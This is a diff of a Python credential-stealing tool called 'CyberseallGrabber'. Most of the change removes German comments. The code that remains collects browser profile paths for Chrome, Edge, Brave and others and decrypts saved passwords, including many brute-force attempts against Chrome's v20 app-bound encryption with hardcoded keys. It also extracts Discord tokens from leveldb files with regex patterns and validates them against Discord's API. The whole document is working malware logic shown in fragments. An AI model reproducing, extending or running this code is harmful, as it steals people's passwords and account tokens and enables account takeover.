@@ -74,14 +74,12 @@ class CyberseallGrabber:
         try:
             def decrypt(buff, master_key):
                 try:
-                    # Methode 1: Standard AES-GCM
                     decrypted_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                     cipher = AES.new(decrypted_key, AES.MODE_GCM, buff[3:15])
                     decrypted = cipher.decrypt(buff[15:])[:-16].decode()
                     return decrypted
                 except:
                     try:
-                        # Methode 2: Direkter DPAPI
                         result = win32crypt.CryptUnprotectData(buff, None, None, None, 0)
                         if result and result[1]:
                             return result[1].decode('utf-8', errors='ignore')
@@ -89,7 +87,6 @@ class CyberseallGrabber:
                         pass
                     
                     try:
-                        # Methode 3: Verschiedene IV Positionen
                         decrypted_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                         for iv_start in [3, 0, 12]:
                             for iv_len in [12, 16, 8]:
@@ -134,7 +131,6 @@ class CyberseallGrabber:
                 'Lightcord': roaming + '\\Lightcord'
             }
             
-            # Browser Apps mit mehreren Profilen
             browser_bases = {
                 'Chrome': local + '\\Google\\Chrome\\User Data',
                 'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
@@ -158,21 +154,17 @@ class CyberseallGrabber:
                 'Iridium': local + '\\Iridium\\User Data'
             }
             
-            # Füge Discord Apps hinzu
             for name, path in discord_apps.items():
                 if os.path.exists(path):
                     paths[name] = path
             
-            # Füge Browser mit Profilen hinzu
             for browser_name, base_path in browser_bases.items():
                 if os.path.exists(base_path):
-                    # Prüfe alle verfügbaren Profile (erweitert auf 10 Profile)
                     for profile in ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5', 'Profile 6', 'Profile 7', 'Profile 8', 'Profile 9', 'Profile 10']:
                         profile_path = os.path.join(base_path, profile)
                         if os.path.exists(profile_path):
                             paths[f'{browser_name}-{profile}'] = profile_path
                     
-                    # Zusätzlich: Automatische Erkennung aller Profile
                     try:
                         for item in os.listdir(base_path):
                             item_path = os.path.join(base_path, item)
@@ -182,18 +174,15 @@ class CyberseallGrabber:
                     except:
                         pass
                     
-                    # Fallback für Browser ohne Profile
                     if browser_name not in [p.split('-')[0] for p in paths.keys()]:
                         paths[browser_name] = base_path
             
-            # Sammle alle verfügbaren Schlüssel
             encryption_keys = {}
             
             for platform, path in paths.items():
                 if not os.path.exists(path):
                     continue
                 
-                # Versuche verschiedene Local State Pfade
                 local_state_paths = [
                     os.path.join(path, "Local State"),
                     os.path.join(os.path.dirname(path), "Local State")
@@ -221,7 +210,6 @@ class CyberseallGrabber:
                         file_path = os.path.join(leveldb_path, file)
                         with open(file_path, "r", errors='ignore') as files:
                             content = files.read()
-                            # Verschiedene Token-Pattern
                             patterns = [
                                 r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)",
                                 r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
@@ -229,7 +217,6 @@ class CyberseallGrabber:
                                 r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}",
                                 r"[A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9_-]{27}",
                                 r"mfa\.[A-Za-z0-9_-]{84}",
-                                # Neue Pattern für andere verschlüsselte Tokens
                                 r"djEw([A-Za-z0-9+/=]+)"
                             ]
                             
@@ -243,13 +230,10 @@ class CyberseallGrabber:
                                             'key': key
                                         }
                                         if pattern.startswith(r"dQw4w9WgXcQ"):
-                                            # Für verschlüsselte Tokens
                                             tokens.append(("dQw4w9WgXcQ:" + match, platform, key))
                                         elif pattern.startswith(r"djEw"):
-                                            # Für djEw verschlüsselte Tokens
                                             tokens.append(("djEw" + match, platform, key))
                                         else:
-                                            # Für direkte Tokens
                                             tokens.append((match, platform, key))
                     except PermissionError: 
                         continue
@@ -258,7 +242,6 @@ class CyberseallGrabber:
                 if token_data and len(token_data) == 3:
                     token, platform, key = token_data
                     if token:
-                        # Bereinige Token
                         clean_token = token.strip().replace("\\", "").replace("\n", "").replace("\r", "")
                         if clean_token and len(clean_token) > 10:
                             cleaned.append((clean_token, platform, key))
@@ -280,12 +263,10 @@ class CyberseallGrabber:
                                 if tok != "Error" and len(tok) > 20:
                                     checker.append(tok)
                             except:
-                                # Versuche direkten Token
                                 if len(encrypted_part) > 50 and '.' in encrypted_part:
                                     checker.append(encrypted_part)
                     elif token.startswith('djEw'):
-                        # djEw verschlüsselte Tokens
-                        encrypted_part = token[4:]  # Entferne 'djEw' Präfix
+                        encrypted_part = token[4:]
                         if encrypted_part and key:
                             try:
                                 decoded_token = base64.b64decode(encrypted_part)
@@ -294,11 +275,9 @@ class CyberseallGrabber:
                                 if tok != "Error" and len(tok) > 20:
                                     checker.append(tok)
                             except:
-                                # Versuche direkten Token
                                 if len(encrypted_part) > 50 and '.' in encrypted_part:
                                     checker.append(encrypted_part)
                     else:
-                        # Direkter Token ohne Verschlüsselung
                         if len(token) > 50 and '.' in token:
                             checker.append(token)
                 except Exception as e:
@@ -316,11 +295,9 @@ class CyberseallGrabber:
                         pass
             
         except Exception as e:
-            # Einfache Fallback-Methode für Token-Suche
             try:
                 fallback_tokens = []
                 
-                # Suche in Discord-Ordnern
                 discord_paths = [
                     os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
                     os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
@@ -334,7 +311,6 @@ class CyberseallGrabber:
                                 try:
                                     with open(os.path.join(path, file), 'r', errors='ignore') as f:
                                         content = f.read()
-                                        # Suche nach aktuellen Token-Patterns
                                         current_tokens = re.findall(r'[A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9_-]{27}', content)
                                         for token in current_tokens:
                                             if token not in fallback_tokens and len(token) > 50:
@@ -342,8 +318,7 @@ class CyberseallGrabber:
                                 except:
                                     pass
                 
-                # Validiere Fallback-Tokens
-                for token in fallback_tokens[:15]:  # Erhöht von 5 auf 15 testen
+                for token in fallback_tokens[:15]:
                     try:
                         headers = {'Authorization': token, 'Content-Type': 'application/json'}
                         res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
@@ -356,7 +331,7 @@ class CyberseallGrabber:
 
     def validate_tokens(self):
         valid_tokens = []
-        for token in self.t[:25]:  # Erhöht von 10 auf 25 Tokens
+        for token in self.t[:25]:
             try:
                 headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                 
@@ -427,7 +402,6 @@ class CyberseallGrabber:
                     if not password or len(password) < 3:
                         return "Failed to decrypt"
 
-                    # METHODE 1: Chrome v10/v11/v20 AES-GCM
                     try:
                         if password[:3] in [b'v10', b'v11', b'v20']:
                             iv = password[3:15]
@@ -439,12 +413,9 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 2: ULTIMATE v20 APP-BOUND ENCRYPTION
                     try:
                         if password[:3] == b'v20':
-                            # v20 verwendet App-Bound Encryption - versuche verschiedene Ansätze
                             
-                            # Standard v20 Struktur: [v20|iv(12)|ciphertext|tag(16)]
                             try:
                                 password_iv = password[3:3+12]
                                 encrypted_password = password[3+12:-16]
@@ -459,7 +430,6 @@ class CyberseallGrabber:
                             except:
                                 pass
                             
-                            # Fallback: Versuche verschiedene Strukturen
                             for iv_start in [3, 4]:
                                 for iv_len in [12, 16]:
                                     for tag_len in [16, 12]:
@@ -479,7 +449,6 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 3: Standard AES-GCM ohne Version-Check
                     try:
                         if len(password) >= 15:
                             iv = password[3:15]
@@ -491,7 +460,6 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 4: Direkter DPAPI
                     try:
                         result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                         if result and result[1]:
@@ -501,7 +469,6 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 5: Erweiterte IV-Positionen und Tag-Längen
                     try:
                         for iv_start in [0, 3, 12, 16]:
                             for iv_len in [8, 12, 16, 24]:
@@ -516,7 +483,6 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 5: AES-CBC Modus
                     try:
                         for iv_start in [0, 3, 16]:
                             for iv_len in [16]:
@@ -530,7 +496,6 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 6: Verschiedene Schlüssellängen
                     try:
                         for key_len in [16, 24, 32]:
                             if len(key) >= key_len and len(password) >= 15:
@@ -543,7 +508,6 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 7: XOR mit verschiedenen Keys
                     try:
                         for xor_key in [key[:16], key[-16:], key[:8] * 2]:
                             if len(xor_key) > 0:
@@ -557,7 +521,6 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 8: Base64 Dekodierung
                     try:
                         import base64
                         b64_decoded = base64.b64decode(password)
@@ -571,7 +534,6 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 9: Verschiedene Encodings
                     try:
                         for encoding in ['latin1', 'cp1252', 'iso-8859-1', 'utf-16le']:
                             try:
@@ -584,7 +546,6 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 10: Brute Force verschiedene Offsets
                     try:
                         for offset in range(1, min(len(password), 10)):
                             shifted = password[offset:] + password[:offset]
@@ -598,18 +559,14 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 11: ULTIMATE PARTIAL RECOVERY
                     try:
                         if isinstance(password, bytes) and len(password) > 10:
-                            # Versuche verschiedene Bereiche zu extrahieren
                             best_result = ""
                             for start in range(0, min(len(password), 30), 1):
                                 for end in range(start + 6, len(password) + 1, 1):
                                     chunk = password[start:end]
-                                    # Extrahiere nur druckbare ASCII-Zeichen
                                     printable_chars = ''.join(chr(c) for c in chunk if 32 <= c <= 126)
                                     if len(printable_chars) >= 6:
-                                        # Prüfe ob es ein sinnvolles Passwort sein könnte
                                         if (any(char.isalnum() for char in printable_chars) and
                                             not printable_chars.startswith('v20') and
                                             len(printable_chars) > len(best_result)):
@@ -620,19 +577,16 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 12: V20 ALTERNATIVE SCHLÜSSEL-ABLEITUNG
                     try:
                         if password[:3] == b'v20':
-                            # v20 könnte eine andere Schlüssel-Ableitung verwenden
                             import hashlib
                             
-                            # Versuche verschiedene Schlüssel-Ableitungen
                             key_variants = [
                                 key,
-                                hashlib.sha256(key).digest()[:32],  # SHA256 des Master Keys
-                                hashlib.md5(key).digest() * 2,      # MD5 doppelt
-                                key[:16] + key[:16],                # Erste 16 Bytes doppelt
-                                key[-16:] + key[-16:],              # Letzte 16 Bytes doppelt
+                                hashlib.sha256(key).digest()[:32],  
+                                hashlib.md5(key).digest() * 2,    
+                                key[:16] + key[:16],              
+                                key[-16:] + key[-16:],          
                             ]
                             
                             for variant_key in key_variants:
@@ -659,11 +613,8 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 13: AGGRESSIVE CHROME PROFILE DECRYPTION
                     try:
-                        # Spezielle Behandlung für Chrome Profile 3 und ähnliche
                         if len(password) >= 20:
-                            # Versuche verschiedene Schlüssel-Derivationen
                             for key_variant in [key, key[:16], key[-16:], key[8:24]]:
                                 if len(key_variant) >= 16:
                                     for iv_offset in range(0, min(len(password), 20)):
@@ -675,11 +626,9 @@ class CyberseallGrabber:
                                                     if len(encrypted_data) >= 16:
                                                         cipher = AES.new(key_variant[:16], AES.MODE_GCM, iv)
                                                         decrypted = cipher.decrypt(encrypted_data[:-16])
-                                                        # Versuche verschiedene Dekodierungen
                                                         for encoding in ['utf-8', 'latin1', 'cp1252']:
                                                             try:
                                                                 result = decrypted.decode(encoding, errors='ignore')
-                                                                # Filtere nur sinnvolle Passwörter
                                                                 clean_result = ''.join(c for c in result if 32 <= ord(c) <= 126)
                                                                 if len(clean_result) >= 6 and any(c.isalnum() for c in clean_result):
                                                                     return clean_result
@@ -690,16 +639,14 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 14: BRUTE FORCE KEY DERIVATION
                     try:
                         if len(password) >= 15 and len(key) >= 16:
-                            # Versuche verschiedene Key-Transformationen
                             key_variants = [
                                 key,
                                 key[::-1],  # Reversed key
                                 bytes(a ^ b for a, b in zip(key, b'\x5A' * len(key))),  # XOR with pattern
-                                key[1:] + key[:1],  # Rotated key
-                                key[::2] + key[1::2],  # Interleaved key
+                                key[1:] + key[:1], 
+                                key[::2] + key[1::2],
                             ]
                             
                             for variant_key in key_variants:
@@ -720,10 +667,8 @@ class CyberseallGrabber:
 
                     # METHODE 15: LEGACY CHROME DECRYPTION
                     try:
-                        # Für ältere Chrome-Versionen ohne v10/v11 Prefix
                         if not password.startswith(b'v1') and len(password) >= 16:
                             try:
-                                # Direkter DPAPI ohne Prefix
                                 result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                                 if result and result[1]:
                                     decrypted = result[1].decode('utf-8', errors='ignore')
@@ -754,7 +699,6 @@ class CyberseallGrabber:
                 
                 for chrome_base in chrome_paths:
                     if os.path.exists(chrome_base):
-                        # Erweiterte Profil-Suche für Chrome
                         for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                             profile_path = os.path.join(chrome_base, profile)
                             if os.path.exists(profile_path):
@@ -765,12 +709,10 @@ class CyberseallGrabber:
                                     "login_file": "Login Data"
                                 })
                         
-                        # Automatische Erkennung aller Chrome-Profile
                         try:
                             for item in os.listdir(chrome_base):
                                 item_path = os.path.join(chrome_base, item)
                                 if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
-                                    # Prüfe ob bereits hinzugefügt
                                     already_added = any(browser["name"] == f"Chrome-{item}" for browser in simple_browsers)
                                     if not already_added:
                                         simple_browsers.append({
@@ -791,7 +733,6 @@ class CyberseallGrabber:
                 
                 for edge_base in edge_paths:
                     if os.path.exists(edge_base):
-                        # Erweiterte Profil-Suche für Edge
                         for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                             profile_path = os.path.join(edge_base, profile)
                             if os.path.exists(profile_path):
@@ -802,12 +743,10 @@ class CyberseallGrabber:
                                     "login_file": "Login Data"
                                 })
                         
-                        # Automatische Erkennung aller Edge-Profile
                         try:
                             for item in os.listdir(edge_base):
                                 item_path = os.path.join(edge_base, item)
                                 if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
-                                    # Prüfe ob bereits hinzugefügt
                                     already_added = any(browser["name"] == f"Edge-{item}" for browser in simple_browsers)
                                     if not already_added:
                                         simple_browsers.append({
@@ -822,7 +761,6 @@ class CyberseallGrabber:
 
                 brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
                 if os.path.exists(brave_base):
-                    # Erweiterte Profil-Suche für Brave
                     for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                         profile_path = os.path.join(brave_base, profile)
                         if os.path.exists(profile_path):
@@ -833,12 +771,10 @@ class CyberseallGrabber:
                                 "login_file": "Login Data"
                             })
                     
-                    # Automatische Erkennung aller Brave-Profile
                     try:
                         for item in os.listdir(brave_base):
                             item_path = os.path.join(brave_base, item)
                             if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
-                                # Prüfe ob bereits hinzugefügt
                                 already_added = any(browser["name"] == f"Brave-{item}" for browser in simple_browsers)
                                 if not already_added:
                                     simple_browsers.append({
@@ -887,18 +823,14 @@ class CyberseallGrabber:
                             with open(state_file, "r", encoding="utf-8") as f:
                                 local_state = json.loads(f.read())
                                 
-                                # Versuche zuerst App-Bound Key für v20 (falls verfügbar)
                                 app_bound_key = None
                                 try:
                                     if "app_bound_encrypted_key" in local_state.get("os_crypt", {}):
-                                        # App-Bound Encryption für v20 - vereinfachte Version
                                         app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
                                         if app_bound_encrypted_key:
-                                            # Versuche bekannte App-Bound Keys
                                             aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
                                             chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
                                             
-                                            # Versuche verschiedene Schlüssel
                                             for test_key in [aes_key, chacha20_key]:
                                                 try:
                                                     # Vereinfachte App-Bound Entschlüsselung
